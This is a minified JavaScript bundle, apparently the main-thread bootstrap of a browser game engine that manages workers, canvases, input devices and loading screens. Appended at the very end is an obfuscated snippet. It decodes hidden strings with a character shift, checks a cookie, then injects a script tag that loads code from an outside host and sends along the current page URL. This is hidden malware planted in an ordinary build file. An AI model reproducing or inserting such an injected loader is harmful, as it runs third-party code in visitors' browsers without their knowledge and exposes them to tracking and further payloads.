this.inputType}setInputType(t){this.inputType=t}addControls(...t){t.forEach((s=>{this.controls.includes(s)||(this.controls.push(s),s.reservePress(((i,e)=>{this.buttons[i]=e})),s.reserveAxes(((i,e,l)=>{switch(i){case"x":this.axes.x.x=e,this.axes.x.y=l;break;case"y":this.axes.y.x=e,this.axes.y.y=l}})),s instanceof gs&&s.reserveCursor(((i,e)=>{this.pointer.x=i,this.pointer.y=e})))}))}checkUpdate(t,s){const i=this.buffers.get(t)||null;if(null===i)return!1;const e=i.get(s)||null;if(null===e)return!1;const l=e.updater[0];return e.updater[0]=0,l>0}post(t,s){if(fs()){let i=this.buffers.get(t)||null;null===i&&this.buffers.set(t,i=new Map);let e=i.get(s.name)||null;if(null===e){const l={name:s.name,value:Ot("float32",s.value.length),updater:Ot("float32",1),init:!1};i.set(s.name,e=l);const a=()=>u(this.channel,"buffer",null,{type:t,value:l});this.isStart?a():this.inits.push(a)}if(e.init)e.value.set(s.value);else{let l=this.reserves.get(t)||null;null===l&&this.reserves.set(t,l=new Map);let a=l.get(s.name)||null;null===a&&l.set(s.name,a=new Array),a.push(this.post.bind(this,t,s))}}else{const i=()=>u(this.channel,t,null,s);this.isStart?i():this.inits.push(i)}}update(){this.controls.forEach((t=>t.update()))}rendering(){this.controls.forEach((t=>t.rendering()))}destroy(){new C(this,"destroy").triggerSync()}}let hs=!1;A(self,"error",(async b=>{await it(b.message)}));let bs=!1,Ut=null,jt=null,Ht=null,X=!1;async function it(b,t=!1){X||(X=!0,u(j,"error",null,{value:b}),u(K,"error",null,{value:b}),await async function(){bs=!0,Ut?.destroy(),jt?.destroy(),Ht?.destroy(),await ne()}(),await async function(s,i){if(!hs){if(hs=!0,Z(s,"red"),i){const e=await ms("setting",!1,ys);await Promise.all([e.setCRTEnable(!1),e.setDesynchronized(!1),e.setMultiThread(!0),oe(),oe()])}alert(s)}}(b,t))}var vt;vt=async function(b,t){const s=ei(b),i={plugins:[Li({process:Ni,request:Oi})],input:s},e=await Ws(i),{output:l}=await e.generate({format:"iife",sourcemap:!!t?.sourcemap}),a=l[0];return null!==a.map?`${a.code}\n//# sourceMappingURL=${c=a.map.mappings,`data:application/json;charset=utf-8;base64,${Bs(c)}`}`:`${a.code}\n//# sourceURL=RedbrickScript`;var c},ci([Promise.all(hi.map((b=>b.load()))).then((b=>{const t=Mi();null!==t&&b.forEach((s=>s.getDatas().forEach((i=>t.add(i))))),rs("start up")}))],(async b=>{await ee();let t=!1;function s(){t=!1}ui||await async function(){await it("Not support is this "+($i()?"hardware or api":"browser"),!0)}(),fs()||E("browser","Not support SharedArrayBuffer");const i=self.document.getElementById("buffers")||null,e=self.document.getElementById("loading")||null,l=self.document.getElementById("touchpad")||null,a=self.document.getElementById("composite")||null,c=self.document.getElementById("raycast")||null,h=self.document.getElementById("ui")||null;if(null===i||null===e||null===l||null===a||null===c||null===h)return;c instanceof HTMLCanvasElement&&(c.style.cssText="display:none;");let o="0.0.0",p="",d=!1,w=!1,y=!1,m="title",I=!1,S=!1,$=!1,R=!1,nt=!1,k=!1,x=!1,D=!1,T=!1,M=!1,ce=!1,he=!1,ue=!1,pe=!1,de=!1,fe=!1,me=!1,ye=!1,ge=!1,ws=!1,Wt=!1,be=!1,we=!1,ve=!1,pt=!1,dt=!1,ft=!1,Bt=!1,vs=!1,xs=!1,As=!1,ks=!1;const Yt=new Array,_=await ms("setting",!1,ys),G=_.hasMultiThread(),mt=G?new MessageChannel:new gt,kt=G?new MessageChannel:new gt,yt=G?new MessageChannel:new gt,Pt=bt?new MessageChannel:new gt,Et=G&&Ze&&bt?new MessageChannel:new gt,Tt=new MessageChannel;Gs(Tt.port1);const St=new ti,Xt=new Ri(pi),rt=new Bi(Xt),H=new Yi(yt.port1),$t=new Ci(".resizer",e),Mt=new Array;try{const Y=await Fs();null!==Y&&(o=Y.version||o,p=Y.copyright||p)}catch{}if("0.0.0"===o&&await it("Not found app info file."),X)return;let xe="";try{xe=(await di.load()).getDatas()[0]}catch{await it("Not found touchpad.html")}if(!X){new C(St,"active").on((Y=>{const{activeSceneName:Ct}=Y;m=Ct})),e.className="visible";try{const Y=!!vt&&G&&!Je,Ct=r=>r&&Y,Ps=async function(r,n){return Ct(r)&&vt?ds("text/javascript",await vt(n)):n},Dt=async(r,n)=>[r?Worker:fi,await Ps(r,n),r||!Ct(r)?{type:"module",bundler:vt}:Je?{type:"module"}:{}],Es=await Promise.all([Dt(G,"./worker.tick.js"),Dt(G&&bt,"./worker.composite.js"),Dt(G&&bt,"./worker.raycast.js"),Dt(G&&Ze&&bt,"./worker.ui.js")]),Rt=performance.now(),[z,V,L,N]=Es.map((([r,n,f])=>new r(n,f)));let _t=null;const Ts=r=>{null===_t&&(_t=r,mi(((n,f,P,O,U)=>{y&&null!==_t&&n!==V&&n!==L&&n!==N&&n!==K&&(_i(_t),O.tickSleeper=!0)})))},Ae=zi(),ke=qi();let Pe={lives:[],sceneName:""},ot=null;const Ee=()=>{g(Ss,1e3/Di)},Ss=()=>{if(Ee(),!d&&null!==ot){const r=ot.sceneName||m||"title";rt.applyData(ot.sound,r,_.getMasterVolume());const n=rt.createTransferData(r);if(yi){const f=gi(Pe,n);if(0===f.length)u(z,"apply-sound-data",null,{value:null});else{Pe=n;const[P,O]=bi(f);u(z,"apply-sound-data",null,{value:P},O)}}ot=null}};Ee();let W=0;J(z,((r,n,f)=>{switch(r){case"standby":u(z,"time",null,{add:Rt}),E("ready","tick"),I=!0;break;case"portready":E("ready","tick"),nt=!0;break;case"portstart":E("ready","tick"),T=!0;break;case"ready":E("ready","tick"),ue=!0;break;case"error":it(f.value);break;case"redraw":Re(),ut((()=>{u(V,"redraw"),u(N,"redraw"),u(L,"redraw")}));break;case"transfer-tickSleeper":null!==mt&&u(z,"transfer-tickSleeper"),Ts(f.tickSleeper);break;case"transfer-update":if(u(z,"apply-update-data"),f.value instanceof Uint8Array){const P=Qe(f.value);ts(Ae,P),St.applyData(Ae)}else St.applyData(f.value);break;case"transfer-sound":if(f.value instanceof Uint8Array){const P=Qe(f.value);ts(ke,P),ot=ke}else ot=f.value;break;case"apply-electron-setting":{const P=new Array;Promise.all(P).then((()=>u(z,"return",n)));break}case"terminate":vs=!0,z.terminate()}})),J(V,((r,n,f)=>{switch(r){case"standby":u(V,"time",null,{add:Rt}),E("ready","composite"),S=!0;break;case"portready":E("ready","composite"),k=!0;break;case"portstart":E("ready","composite"),M=!0;break;case"ready":E("ready","composite"),pe=!0;break;case"screeninit":E("screeninit","composite"),ge=!0;break;case"renderready":E("ready","composite"),be=!0;break;case"restore":s();break;case"pleasewait":0===W&&u(j,"pleasewait"),W++,f.isShow&&Ms();break;case"unlockpleasewait":W--,0===W&&u(j,"unlockpleasewait"),f.isShow&&Rs();break;case"post-asset-data":break;case"terminate":xs=!0,V.terminate()}})),J(L,((r,n,f)=>{switch(r){case"standby":u(L,"time",null,{add:Rt}),E("ready","raycast"),$=!0;break;case"portready":E("ready","raycast"),x=!0;break;case"portstart":E("ready","raycast"),ce=!0;break;case"ready":E("ready","raycast"),de=!0;break;case"screeninit":E("screeninit","raycast"),me=!0;break;case"renderready":E("ready","raycast"),we=!0;break;case"restore":s();break;case"pleasewait":0===W&&u(j,"pleasewait"),W++,f.isShow&&Cs();break;case"unlockpleasewait":W--,0===W&&u(j,"unlockpleasewait"),f.isShow&&_s();break;case"terminate":As=!0,L.terminate()}})),J(N,((r,n,f)=>{switch(r){case"standby":u(N,"time",null,{add:Rt}),E("ready","ui"),R=!0;break;case"portready":E("ready","ui"),D=!0;break;case"portstart":E("ready","ui"),he=!0;break;case"ready":E("ready","ui"),fe=!0;break;case"screeninit":E("screeninit","ui"),ye=!0;break;case"renderready":E("ready","ui"),ve=!0;break;case"pleasewait":0===W&&u(j,"pleasewait"),W++,f.isShow&&Ds();break;case"unlockpleasewait":W--,0===W&&u(j,"unlockpleasewait"),f.isShow&&zs();break;case"visibleBuffers":const P=self.document.querySelector("#buffers");null!==P&&At(P,{display:"block"});break;case"restore":s();break;case"terminate":ks=!0,N.terminate()}}));let zt=0;const qt=()=>{0===zt&&self.document.querySelectorAll("#loading").forEach((r=>{r.className="visible"})),zt++},It=()=>{zt--,0===zt&&self.document.querySelectorAll("#loading").forEach((r=>{r.className="hide"}))};if(qt(),Z("create workers"),await new Promise((r=>{const n=()=>{I&&S&&$&&R?r(null):g(n)};g(n)})),X)return;let Te=xt(),Se=_.hasFullscreen(),$e=es(),Me=!_.hasCRT();const lt=new gs(1,[i,l],H),ct=new ji(1,_,H),q=new Ui(1,l,H,xe),Ce=()=>{if(Ht=ut(Ce),Mt.length>0)return wi(Mt).asc((O=>O.timeStamp)),void async function(O){t||(t=!0,await it(`Lost context of <${O}> renderer`,!0))}(Mt[0].name);const r=xt();Te!==r&&(Te=r,r&&st());const n=!!_.hasFullscreen();n!==Se&&(Se=n,_.hasBrowserFullscreen()||(n?se():ss()));const f=es();$e!==f&&($e=f,Gt().then((()=>st())));const P=q.hasVisible();P!==Oe&&(Oe=P,Gt().then((()=>st())),P&&Lt()),!Ge()&&xt()&&ne(),!ps()&&q.hasVisible()&&q.hide()},$s=()=>!!q?.hasVisible()&&H.getInputType()===B.TOUCHPAD,Vt=()=>pt||dt||ft,De=(r=!1)=>{const n=$s()&&vi(),[f,P]=xi(_,is,n),[O,U]=Ai(_,is,n);$t.setSize(f,P),a instanceof Element&&(ie(a)||(a.width=f,a.height=P)),c instanceof Element&&(ie(c)||(c.width=O,c.height=U)),h instanceof Element&&(ie(h)||(h.width=O,h.height=U)),$t.resize(!0,n),null!==l&&(n&&self.innerHeight>self.innerWidth?At(l,{left:"0px",bottom:"0px",width:"100vw",height:"50vh"}):At(l,{left:"0px",bottom:"0px",width:"100vw",height:"100vh"})),r||u(K,"resize",null,{isTouchPad:n})},Gt=(r=!1)=>new Promise((n=>{ut((()=>{De(r),n()}))}));ki(De),_.hasFullscreen()&&!_.hasBrowserFullscreen()&&await se(),await Ks(_.getLanguage());const Ft=()=>{Vt()||u(j,"sleep")},Kt=()=>{Vt()||u(j,"unsleep")},Ms=()=>{Ft(),pt||qt(),pt=!0},Cs=()=>{Ft(),dt||qt(),dt=!0},Ds=()=>{Ft(),ft||qt(),ft=!0},Rs=()=>{pt&&It(),pt=!1,Kt()},_s=()=>{dt&&It(),dt=!1,Kt()},zs=()=>{ft&&It(),ft=!1,Kt()},Re=()=>{const r=_.hasCRT();Me!==r&&(i instanceof Element&&a instanceof HTMLCanvasElement&&c instanceof HTMLCanvasElement&&h instanceof HTMLCanvasElement&&(r?(c.remove(),h.remove(),i.append(a)):(a.remove(),i.append(c,h))),Me=r)},qs=r=>{d!==r&&(d=r,r?(u(j,"sleep",null,{scene:as()?"title":null}),u(K,"sleep"),rt.pause()):(u(j,"unsleep"),u(K,"unsleep"),rt.play()))};J(K,((r,n,f)=>{switch(r){case"resize":Gt(!0);break;case"startloadassets":Xt.load((()=>u(K,"loadcount")),(P=>u(K,"loaderror",null,{value:P.message})));break;case"loadedasset":ws=!0;break;case"loadingend":Wt=!0;break;case"error":it(f.value);break;case"lostcontext":Mt.push({name:f.name,timeStamp:f.timeStamp})}}));const Is=()=>{z.terminate(),V.terminate(),L.terminate(),N.terminate(),St.destroy(),Xt.destroy(),rt.destroy(),H.destroy(),$t.destroy()};if(A(self,"pagehide",(()=>{Is(),Pi()})),Yt.push($t,rt,H),Z("transfer message ports"),await Promise.all([new Promise((r=>{const n=()=>{nt?r(null):g(n)};g(n),u(z,"portready",null,{RaycastChannel:kt.port1,UIChannel:mt.port1,ControlChannel:yt.port2,LogChannel:Tt.port2},[kt.port1,mt.port1,yt.port2,Tt.port2])})),new Promise((r=>{const n=()=>{k?r(null):g(n)};g(n),u(V,"portready",null,{RaycastScreenChannel:Pt.port2,UIScreenChannel:Et.port2},[Pt.port2,Et.port2])})),new Promise((r=>{const n=()=>{x?r(null):g(n)};g(n),u(L,"portready",null,{RaycastChannel:kt.port2,RaycastScreenChannel:Pt.port1},[kt.port2,Pt.port1])})),new Promise((r=>{const n=()=>{D?r(null):g(n)};g(n),u(N,"portready",null,{UIChannel:mt.port2,UIScreenChannel:Et.port1},[mt.port2,Et.port1])}))]),X||(Z("starting message ports"),await Promise.all([new Promise((r=>{const n=()=>{T?(yt.port1.start(),Tt.port1.start(),r(null)):g(n)};g(n),u(z,"portstart")})),new Promise((r=>{const n=()=>{M?r(null):g(n)};g(n),u(V,"portstart")})),new Promise((r=>{const n=()=>{ce?r(null):g(n)};g(n),u(L,"portstart")})),new Promise((r=>{const n=()=>{he?r(null):g(n)};g(n),u(N,"portstart")}))]),X))return;let _e,ze,qe,Ie;H.addControls(lt,ct,q),[_e,ze,qe,Ie]=[!0,"auto",["auto"],!1];const Vs={version:o,copyright:p,useVSync:_e,useANGLEAPI:ze,useDesynchronized:_.hasDesynchronized(),ANGLEAPIList:qe,useDevTools:Ie,initScene:"title"},Zt={screen:ae(a)},Jt={screen:ae(c)},Qt={screen:ae(h)},Ls=new Array,Ve=new Array,Le=new Array,Ne=new Array;if("OffscreenCanvas"in self&&Zt.screen instanceof self.OffscreenCanvas&&Ve.push(Zt.screen),"OffscreenCanvas"in self&&Jt.screen instanceof self.OffscreenCanvas&&Le.push(Jt.screen),"OffscreenCanvas"in self&&Qt.screen instanceof self.OffscreenCanvas&&Ne.push(Qt.screen),b(),Z("initialize workers"),await Promise.all([new Promise((r=>{const n=()=>{ue?r(null):g(n)};u(z,"init",null,{value:Vs},Ls),g(n)})),new Promise((r=>{const n=()=>{pe?r(null):g(n)};u(V,"init",null,{value:Zt},Ve),g(n)})),new Promise((r=>{const n=()=>{de?r(null):g(n)};u(L,"init",null,{value:Jt},Le),g(n)})),new Promise((r=>{const n=()=>{fe?r(null):g(n)};u(N,"init",null,{value:Qt},Ne),g(n)}))]),X||(H.start(),await ee("ready"),Z("compile shaders"),await new Promise((r=>{const n=async()=>{be&&we&&ve?r(null):g(n)};g(n),u(V,"compileshader"),u(N,"compileshader"),u(L,"compileshader")})),X))return;Bt=!0;let Oe=q.hasVisible(),tt=null;const Ns=r=>{if("editor"!==m)return;let n="none";if(r.ctrlKey){switch(r.key.toLocaleLowerCase()){case"b":n="build";break;case"o":n="open";break;case"s":n="save";break;case"n":n="new";break;case"p":n="preview";break;default:n="none"}u(yt.port1,"editor",null,{name:n})}},ht=()=>{tt?.hasLive()||H.getInputType()===B.KEYBOARD||st().then((()=>{lt.changeDevice()}))},Ue=()=>{tt?.hasLive()||H.getInputType()===B.GAMEPAD||st().then((()=>{ct.changeDevice()}))},Lt=()=>{tt?.hasLive()||q.hasVisible()&&H.getInputType()===B.TOUCHPAD||(tt=g((()=>{st().then((()=>{q.changeDevice()}))}),100))},Os=()=>{u(j,"changescene",null,{value:"title"})},te=r=>{if(!bs&&!d&&Wt&&null!==m){const n=r.getType();n!==B.TOUCHPAD&&q.hide();const f=new Array;Ge()&&(n===B.KEYBOARD&&"title"!==m?f.push(Zs()):xt()&&f.push(ne())),n===B.TOUCHPAD?f.push(se()):_.hasBrowserFullscreen()&&"title"===m&&Ei(!1)&&f.push(ss()),f.length>0&&(w=!0,Promise.all(f).finally((()=>{w=!1})))}};A(self.document.body,"touchend",Lt),A(self.document.body,"keydown",ht),A(self.document.body,"mousedown",ht),A(self.document.body,"mousemove",ht),A(self,"contextmenu",(r=>{r.stopPropagation(),r.preventDefault()})),lt.reservePress(ht),lt.reserveAxes(ht),lt.reserveCursor(ht),ct.reservePress(Ue),ct.reserveAxes(Ue),q.reservePress(Lt),q.reserveAxes(Lt),q.reserveExit(Os),q.reserveChange(te),lt.reserveChange(te),ct.reserveChange(te),A(self.document.body,"keydown",Ns);const je=()=>{H.getInputType()!==B.GAMEPAD||Bt||u(j,"changescene",null,{value:"title"})};new C(ct,"changeconnect").on((({value:r})=>{r||je()})),A(self,"gamepaddisconnected",(()=>{je()})),Z("starting application");const He=()=>{if(jt=g(He),Vt())return;const r=Js()||Ti()||as()||Si()||w;qs(r),r||Yt.forEach((n=>n.update()))},We=r=>{Ut=ut(We),Vt()||(Re(),Qs(),Yt.forEach((n=>n.rendering())))};jt=g(He),Ut=ut(We),Ht=ut(Ce),await new Promise((async r=>{const n=new Array,f=new Array;n.push(...ns.map((U=>U.load().then((Nt=>{Nt.getDatas().forEach((Be=>{"ImageBitmap"in self&&Be instanceof self.ImageBitmap&&f.unshift(Be)}))}))))),n.push(ee("init")),await Promise.all(n);const P=new Array;ns.map((U=>U.getDatas())).forEach((U=>P.push(...U)));const O=()=>{if(Wt){if(Bt=!1,X)return;r(null)}else g(O)};g(O),u(V,"screeninit"),u(L,"screeninit"),u(N,"screeninit"),await Promise.all([new Promise((U=>{const Nt=()=>{ge&&me&&ye?U(null):g(Nt)};g(Nt)})),new Promise((U=>{g((()=>U(null)),500)}))]),u(z,"startloadingscreen"),u(V,"startloadingscreen"),u(L,"startloadingscreen"),u(N,"startloadingscreen",null,{logos:P},f),await st(),It()})),c instanceof HTMLCanvasElement&&(c.style.cssText=""),y=!0,oe("run"),u(V,"run"),u(N,"run"),u(L,"run"),u(z,"run"),Z("start game"),rs("REFRESH RENDERER")}catch(Y){throw Y}}}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));